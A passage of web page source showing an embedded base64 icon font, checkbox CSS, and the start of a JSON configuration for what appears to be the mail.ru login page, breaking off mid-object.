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) format("woff");
  font-weight: normal;
  font-style: normal;
}
.label-0-65 {
  cursor: pointer;
  display: inline-block;
  position: relative;
  min-width: 12px;
  min-height: 12px;
  user-select: none;
}
.box-0-66 {
  width: 10px;
  height: 10px;
  border: 1px solid #9a9ca0;
  cursor: pointer;
  content: "";
  display: inline-block;
  position: relative;
  visibility: visible;
  line-height: 20;
  margin-right: 6px;
  border-radius: 2px;
  vertical-align: middle;
}
.input-0-67 {
  width: 18px;
  height: 10px;
  margin: 0;
  padding: 0;
  position: absolute;
  visibility: hidden;
}
.input-0-67:checked + div::after {
  top: 50%;
  left: -2px;
  width: 16px;
  color: #000;
  speak: none;
  height: 20px;
  content: "✔";
  position: absolute;
  font-size: 16px;
  visibility: visible;
  margin-top: -1px;
  font-style: normal;
  font-family: 'sept';
  line-height: 2px;
  font-weight: normal;
  font-variant: normal;
  vertical-align: baseline;
  text-transform: none;
  font-feature-settings: normal;
  webkit-font-smoothing: antialiased;
  moz-osx-font-smoothing: grayscale;
}
.disabled-0-68 {
  opacity: 0.48;
}
        </style>
        <script type="text/html" id="state">
            {"password":"","dirtyFields":["Username","Password","captcha"],"provider":0,"domain":"mail.ru","login":"","domains":[{"name":"mail.ru","external":false},{"name":"inbox.ru","external":false},{"name":"bk.ru","external":false},{"name":"list.ru","external":false},{"name":"yandex.ru","external":true},{"name":"gmail.com","external":true},{"name":"yahoo.com","external":true}],"config":{"version":"2kit","restore":"phone","can_restore":"0","paths":{"js":"//img.imgsmail.ru/login/{build}/{lang}/app.js","css":"//img.imgsmail.ru/login/{build}/css/","images":"//img.imgsmail.ru/login/{build}/images/","authGate":"//img.imgsmail.ru/ag/2.0.9/authGate.js"},"urls":{"fest":"/cache/templates/","authOrigin":"https://auth.mail.ru","passremindUrl":"https://e.mail.ru/password/restore/","signupUrl":"https://e.mail.ru/signup","portalOrigin":"https://portal.mail.ru","captchaUrl":"https://c.mail.ru/c/1","page":"https://e.mail.ru/messages/inbox","pageMobile":"https://touch.mail.ru/","xRayRadarUrl":"//xray.imgsmail.ru","statdRadarUrl":"//stat.radar.imgsmail.ru"},"portal":{"logo":{"name":"href","href":"https://mail.ru","target":"_self","img":"//img.imgsmail.ru/login/{build}/images/logo2x.png"},"mode":["responsive"]},"counters":{"login":{"default":{"render":16784017,"back":16784074,"captcha":16784019,"passremind":1507549,"signup":1507557,"error":1507575,"signin":{"saveauth":1507536,"nosaveauth":1509556},"restore":{"open":22145342,"not-opened":31458704,"send":22145383,"sms":27769459,"push":27769436,"email":27769462,"problems":27769475},"close":{"button":1507562,"escape":1507565},"email-providers":{"yandexru":1661519,"ramblerru":1661520,"gmailcom":1661522,"other":1661524,"yahoocom":22710137},"social":{"ok":16784045,"vk":16784042,"fb":16784046,"error":16784047}},"splash":{"render":1507569,"back":29285568,"captcha":29285570,"passremind":1507548,"signup":1507550,"error":1507574,"signin":{"saveauth":1507533,"nosaveauth":29285572},"restore":{"open":29285574,"not-opened":29285575,"send":29285577,"sms":29285578,"push":29285580,"email":29285581,"problems":29285584},"close":{"button":29285585,"escape":29285587},"email-providers":{"yandexru":29285590,"ramblerru":29285592,"gmailcom":29285594,"other":29285596,"yahoocom":29285598},"social":{"ok":29285600,"vk":29285601,"fb":29285603,"error":29285604}},"oneclick":{"render":29285644,"back":29285645,"captcha":29285646,"passremind":29285648,"signup":29285690,"error":29285650